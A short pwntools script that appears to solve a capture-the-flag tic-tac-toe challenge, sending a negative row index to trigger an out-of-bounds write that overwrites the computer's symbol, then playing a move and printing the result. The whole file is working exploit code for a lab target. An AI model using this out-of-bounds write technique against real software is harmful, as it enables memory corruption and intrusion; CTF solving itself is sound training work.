#!/usr/bin/env python3
from pwn import *

HOST = args.HOST or "chall.lac.tf"
PORT = int(args.PORT or 30001)


def main() -> None:
    if args.LOCAL:
        p = process("./chall")
    else:
        p = remote(HOST, PORT)

    # OOB write: index = (x-1)*3 + (y-1) = -23 -> overwrite `computer` with 'X'
    p.recvuntil(b"Enter row")
    p.sendline(b"-7")
    p.recvuntil(b"Enter column")
    p.sendline(b"2")

    # Let the computer win as 'X'
    p.recvuntil(b"Enter row")
    p.sendline(b"1")
    p.recvuntil(b"Enter column")
    p.sendline(b"1")

    print(p.recvall().decode(errors="ignore"))


if __name__ == "__main__":
    main()
